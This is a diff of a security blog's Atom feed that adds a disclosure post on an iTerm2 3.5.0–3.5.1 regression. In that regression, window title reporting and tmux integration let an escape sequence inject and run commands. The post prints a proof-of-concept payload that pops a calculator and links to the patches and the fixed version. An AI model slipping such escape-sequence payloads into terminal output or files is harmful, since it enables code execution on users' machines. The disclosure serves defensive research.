@@ -1,4 +1,58 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://vin01.github.io/piptagole/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vin01.github.io/piptagole/" rel="alternate" type="text/html" /><updated>2024-05-21T08:19:35+00:00</updated><id>https://vin01.github.io/piptagole/feed.xml</id><title type="html">Vin01’s Blog</title><subtitle>A collection of tidbits which might do some good out there or at least be interesting for some of you.</subtitle><entry><title type="html">Abusing url handling in iTerm2 and Hyper for code execution</title><link href="https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/code-execution%22/2024/05/21/arbitrary-url-schemes-terminal-emulators.html" rel="alternate" type="text/html" title="Abusing url handling in iTerm2 and Hyper for code execution" /><published>2024-05-21T07:13:10+00:00</published><updated>2024-05-21T07:13:10+00:00</updated><id>https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/code-execution%22/2024/05/21/arbitrary-url-schemes-terminal-emulators</id><content type="html" xml:base="https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/code-execution%22/2024/05/21/arbitrary-url-schemes-terminal-emulators.html"><![CDATA[<h2 id="what-are-escape-sequences">What are escape sequences</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://vin01.github.io/piptagole/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vin01.github.io/piptagole/" rel="alternate" type="text/html" /><updated>2024-06-16T18:56:08+00:00</updated><id>https://vin01.github.io/piptagole/feed.xml</id><title type="html">Vin01’s Blog</title><subtitle>A collection of tidbits which might do some good out there or at least be interesting for some of you.</subtitle><entry><title type="html">Abusing title reporting and tmux integration in iTerm2 for code execution</title><link href="https://vin01.github.io/piptagole/escape-sequences/iterm2/rce/2024/06/16/iterm2-rce-window-title-tmux-integration.html" rel="alternate" type="text/html" title="Abusing title reporting and tmux integration in iTerm2 for code execution" /><published>2024-06-16T18:13:10+00:00</published><updated>2024-06-16T18:13:10+00:00</updated><id>https://vin01.github.io/piptagole/escape-sequences/iterm2/rce/2024/06/16/iterm2-rce-window-title-tmux-integration</id><content type="html" xml:base="https://vin01.github.io/piptagole/escape-sequences/iterm2/rce/2024/06/16/iterm2-rce-window-title-tmux-integration.html"><![CDATA[<h2 id="regression-turned-into-rce">Regression turned into RCE</h2>
+
+<p>I am skipping an introduction to escape sequences here as I recently wrote more about them in my <a href="https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html">previous post</a>. From a security perspective, they are to terminal emulators what XSS is to browsers.</p>
+
+<p>This post is about a new bug which affects only iTerm2 3.5.0 and 3.5.1 (released on May 20 and June 11 respectively) because of a regression.</p>
+
+<p>In versions prior to 3.5.0, window title reporting was disabled. So you could not just use following to retrieve the title of terminal window and put it in <code class="language-plaintext highlighter-rouge">stdin</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo -e "\e]21t"
+</code></pre></div></div>
+
+<p><strong>Note</strong>: David Leadbeater also independently noticed this regression and reported it <a href="https://www.openwall.com/lists/oss-security/2024/06/15/1">here</a></p>
+
+<h2 id="what-is-wrong-with-window-title-reporting">What is wrong with window title reporting?</h2>
+
+<p><a href="https://www.x.org/docs/xterm/ctlseqs.pdf">Ps 2</a> escape sequence allows <em>setting</em> the window title.</p>
+
+<p>An example:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -e "\033]0;This is the window title\a"
+</code></pre></div></div>
+
+<p><a href="https://gist.github.com/halcyon/334da650816876d7be4d1bee8a157f25#file-gistfile1-txt-L872">CSI Ps 21 t</a> can be used to retrieve that title and put it in <code class="language-plaintext highlighter-rouge">stdin</code> as shown above. This makes exploitation very easy as at this point, all that is required is for the user to hit Enter and arbitrary code present in that title will happily execute itself.</p>
+
+<p>Patch that disables title reporting by default: <a href="https://gitlab.com/gnachman/iterm2/-/commit/f1e89f78dd72dcac3ba66d3d6f93db3f7f649219">f1e89f78</a></p>
+
+<h2 id="tmux-integration-made-it-worse">Tmux integration made it worse</h2>
+
+<p>Native tmux integration (enabled by default) in iTerm2 had a weakness which allowed sneaking in the reported title and also provided a way to send newlines after the title was reported.</p>
+
+<p>Patch: <a href="https://gitlab.com/gnachman/iterm2/-/commit/fc60236a914d63fb70a5c632e211203a4f1bd4dd">fc60236a</a></p>
+
+<h2 id="can-i-haz-that-sweet-poc-plz">Can I haz that sweet PoC plz?</h2>
+
+<p>try this out yourself:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run --rm  vin01/escape-seq-test:cve-2024-38396
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat poc-iterm2-rce.txt
+</code></pre></div></div>
+
+<p>Download <a href="/piptagole/assets/poc-iterm2-rce.txt">poc-iterm2-rce.txt</a></p>
+
+<p>The file contains this payload <code class="language-plaintext highlighter-rouge">\033]2;s&amp;open -aCalculator&amp;\a\033[21t  \x1bP1000p%session-changed  s</code> which sets <code class="language-plaintext highlighter-rouge">s&amp;open -aCalculator&amp;</code> as window title and then retrieves it back to execute and pop a calculator.</p>
+
+<p>Source code: <a href="https://github.com/vin01/poc-cve-2024-38396">https://github.com/vin01/poc-cve-2024-38396</a></p>
+
+<h2 id="a-fix-released-within-2-days-of-reporting">A fix released within 2 days of reporting</h2>
+
+<p><strong>Upgrade to iTerm2 3.5.2</strong>: <a href="https://iterm2.com/downloads.html">https://iterm2.com/downloads.html</a></p>
+
+<p>Please think twice before you enable <code class="language-plaintext highlighter-rouge">Terminal may report window title</code> setting in iTerm2. It might not be worth the security risk as it allows arbitrary text to end up in <code class="language-plaintext highlighter-rouge">stdin</code> which is never a good idea.</p>]]></content><author><name></name></author><category term="escape-sequences" /><category term="iterm2" /><category term="rce" /><summary type="html"><![CDATA[Regression turned into RCE]]></summary></entry><entry><title type="html">Abusing url handling in iTerm2 and Hyper for code execution</title><link href="https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html" rel="alternate" type="text/html" title="Abusing url handling in iTerm2 and Hyper for code execution" /><published>2024-05-21T07:13:10+00:00</published><updated>2024-05-21T07:13:10+00:00</updated><id>https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators</id><content type="html" xml:base="https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html"><![CDATA[<h2 id="what-are-escape-sequences">What are escape sequences</h2>
 
 <p>Modern terminals are very capable tools with quite extended support for various <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">escape sequences</a>. These escape sequences are specially treated by terminal emulators to generate colors, cursor styles, cliboard access and even <em>*wink*</em> hyperlinks!</p>
 
@@ -158,7 +212,7 @@
 
 <p><strong>Upgrade to iTerm2 3.5.0</strong>: <a href="https://iterm2.com/downloads.html">https://iterm2.com/downloads.html</a></p>
 
-<p><a href="https://iterm2.com/donate.html">How to donate to iTerm2</a></p>]]></content><author><name></name></author><category term="escape-sequences" /><category term="iterm2" /><category term="hyper" /><category term="code-execution&quot;" /><summary type="html"><![CDATA[What are escape sequences]]></summary></entry><entry><title type="html">You can not simply publicly access private secure links, can you?</title><link href="https://vin01.github.io/piptagole/security-tools/soar/urlscan/hybrid-analysis/data-leaks/urlscan.io/cloudflare-radar%22/2024/03/07/url-database-leaks-private-urls.html" rel="alternate" type="text/html" title="You can not simply publicly access private secure links, can you?" /><published>2024-03-07T16:18:13+00:00</published><updated>2024-03-07T16:18:13+00:00</updated><id>https://vin01.github.io/piptagole/security-tools/soar/urlscan/hybrid-analysis/data-leaks/urlscan.io/cloudflare-radar%22/2024/03/07/url-database-leaks-private-urls</id><content type="html" xml:base="https://vin01.github.io/piptagole/security-tools/soar/urlscan/hybrid-analysis/data-leaks/urlscan.io/cloudflare-radar%22/2024/03/07/url-database-leaks-private-urls.html"><![CDATA[<p><em>turns out, you can even search for them with powerful search engines!</em></p>
+<p><a href="https://iterm2.com/donate.html">How to donate to iTerm2</a></p>]]></content><author><name></name></author><category term="escape-sequences" /><category term="iterm2" /><category term="hyper" /><category term="url-handlers" /><category term="code-execution" /><summary type="html"><![CDATA[What are escape sequences]]></summary></entry><entry><title type="html">You can not simply publicly access private secure links, can you?</title><link href="https://vin01.github.io/piptagole/security-tools/soar/urlscan/hybrid-analysis/data-leaks/urlscan.io/cloudflare-radar%22/2024/03/07/url-database-leaks-private-urls.html" rel="alternate" type="text/html" title="You can not simply publicly access private secure links, can you?" /><published>2024-03-07T16:18:13+00:00</published><updated>2024-03-07T16:18:13+00:00</updated><id>https://vin01.github.io/piptagole/security-tools/soar/urlscan/hybrid-analysis/data-leaks/urlscan.io/cloudflare-radar%22/2024/03/07/url-database-leaks-private-urls</id><content type="html" xml:base="https://vin01.github.io/piptagole/security-tools/soar/urlscan/hybrid-analysis/data-leaks/urlscan.io/cloudflare-radar%22/2024/03/07/url-database-leaks-private-urls.html"><![CDATA[<p><em>turns out, you can even search for them with powerful search engines!</em></p>
 
 <h2 id="summary">Summary</h2>
 
